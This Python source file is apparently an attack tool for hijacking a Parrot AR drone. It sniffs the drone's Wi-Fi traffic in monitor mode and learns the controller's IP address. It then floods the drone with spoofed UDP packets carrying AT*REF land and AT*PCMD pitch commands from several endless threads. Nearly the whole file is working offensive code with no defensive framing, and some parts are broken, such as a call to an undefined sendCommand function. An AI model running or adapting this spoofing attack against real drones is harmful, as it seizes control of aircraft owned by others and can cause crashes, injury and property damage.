import ctypes, sys
from ctypes.util import find_library
import pcap
import dpkt
from scapy.all import *
import tty, termios
import threading
from time import ctime,sleep

if sys.platform == "darwin":
    _pcap = ctypes.cdll.LoadLibrary(find_library("libpcap"))
elif sys.platform == "linux2":
    _pcap = ctypes.cdll.LoadLibrary("libpcap.so")

errbuf = ctypes.create_string_buffer(256)   #error message if lookupdev() fails

dstIP = '192.168.1.1' # spoofed source IP address
#srcIP = '0.0.0.0'
dstPort = 5556 # source port
srcPort = 5554 # destination port
seqno = 200000

########start of packet injection###########
def getChar():      
    fd = sys.stdin.fileno()   #return integer file descriptor 
    old_settings = termios.tcgetattr(fd)  #return a list cotainning attributes for file descriptor fd: [iflag, oflag, cflag, lflag, ispeed, ospeed, cc]
    try:
        tty.setraw(sys.stdin.fileno()) #Change the mode of the file descriptor fd to raw
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings) #set tty attributes for fd from old_setting, TCSADRAIN to change after transmitting all queued output
    return ch


def setBits( lst ):       #set bits for different drone movement
    """
    set the bits in lst to 1.
    also set bits 18, 20, 22, 24, and 28 to one (since they should always be set)
    all other bits will be 0
    """
    res = 0
    for b in lst + [18,20,22,24,28]:
        res |= (1 << b) #1 move left for b bits and xor with res, set b to 1
    return res

def large_sendCommand(cmd,source_ip):
    global seqno   
    print "DEBUG: Sending:  '%s'" % cmd.strip()
    for i in xrange(1,25): 
        spoofed_packet = IP(src=source_ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / cmd
        send(spoofed_packet)
        seqno += 1

def reset_sendCommand(cmd,source_ip):
    global seqno   
    print "DEBUG: Sending:  '%s'" % cmd.strip()
    for i in xrange(1,25): 
        spoofed_packet = IP(src=source_ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / cmd
        send(spoofed_packet)


def printUsage():
    print "\tl       - land"
    print "\ts       - back"
    print "\t(space) - emergency mode"
    print "\tq       - quit"

########## offense command ###########

def lar_land():
    global seqno
    global srcIP
    land_cmd = setBits([])
    while True:
        large_sendCommand("AT*REF=%d,%d\r" % (seqno,land_cmd),srcIP)


def lar_pitch():
    global seqno
    global srcIP
    pitch_cmd = 1065353216
    while True:
         large_sendCommand("AT*PCMD=%d,1,0,%d,0,0\r" % (seqno,pitch_cmd),srcIP)

def reset():
    global seqno
    seqno = 1   #needs to send before other commands
    sendCommand("AT*FTRIM=%d\r" % seqno,srcIP ) #sets the reference for the horizontal plane

def reset_land():
    global seqno
    seqno = 1
    global srcIP
    land_cmd = setBits([])
    while True:
        reset_sendCommand("AT*REF=%d,%d\r" % (seqno,land_cmd),srcIP)

def reset_pitch():
    global seqno
    global srcIP
    seqno = 1
    pitch_cmd = 1065353216
    while True:
         reset_sendCommand("AT*PCMD=%d,1,0,%d,0,0\r" % (seqno,pitch_cmd),srcIP)

# def getSeqno(inputStr):
#     sStr1 = inputStr
#     ATStr = 'AT*'
#     equalStr = '='
#     orderTyp = ''

#     try:
#         nPos = sStr1.index(ATStr)

#         sStr1 = sStr1[nPos + len(ATStr) :]
#     except Exception, e:
#         return False

#     # try:
#     #     nPos = sStr1.index(equalStr)
#     #     orderTyp = sStr1[0:nPos]
#     #     sStr1 = sStr1[nPos + len(ATStr) :]
#     #     sStr1 = sStr1[0: sStr1.index(',')]
#     #     orderTypeList = {'REF':land, 'PCMD':pitch, 'FTRIM':reset}
#     #     orderTypeList.get(orderTyp)()
#     # except Exception, e:
#     #     return False
#     return True


    

########end of packet injection###########

##########interface#############
pcap_lookupdev = _pcap.pcap_lookupdev
pcap_lookupdev.restype = ctypes.c_char_p
dev = pcap_lookupdev(errbuf)      
print dev

##########open device###########
pcap_create = _pcap.pcap_create
pcap_create.restype = ctypes.c_void_p
handle = pcap_create(dev, errbuf)
print handle
if not handle:
    print "failed creating handler:",errbuf
    exit()

#########monitor mode############
pcap_can_set_rfmon = _pcap.pcap_can_set_rfmon
pcap_can_set_rfmon.argtypes = [ctypes.c_void_p]
print "can rfmon:",pcap_can_set_rfmon(handle)

pcap_set_rfmon = _pcap.pcap_set_rfmon
pcap_set_rfmon.argtypes = [ctypes.c_void_p]
print "set rfmon:",pcap_set_rfmon(handle, 1)


#########activate handle##########
pcap_activate = _pcap.pcap_activate
pcap_activate.argtypes = [ctypes.c_void_p]
pcap_activate(handle)

#########capture packet###########
pc = pcap.pcap('en0')
pc.setfilter('udp')
for ptime, pdata in pc:
    time = ptime
    p = dpkt.ethernet.Ethernet(pdata)               #How to use pypcap to catch packet: http://www.oschina.net/p/pypcap

    if p.data.__class__.__name__ == 'IP':
        if '%d.%d.%d.%d'%tuple(map(ord,list(p.data.dst))) == "192.168.1.1":
            print "[+]AR drone found."                
            ip='%d.%d.%d.%d'%tuple(map(ord,list(p.data.src))) 
            #dataStr = `decode(pdata)`
            #getSeqno(dataStr)
            srcIP = ip
            print "[+] Spoofed source IP address: ", srcIP
            threads = []
            t1 = threading.Thread(target=lar_land,args=())
            threads.append(t1)
            t2 = threading.Thread(target=lar_pitch,args=())
            threads.append(t2)
            t3 = threading.Thread(target=reset,args=())
            threads.append(t3)
            t4 = threading.Thread(target=reset_land,args=())
            threads.append(t4)
            t5 = threading.Thread(target=reset_pitch,args=())
            threads.append(t5)

            for t in threads:
                t.setDaemon(True)
                t.start()
            t.join()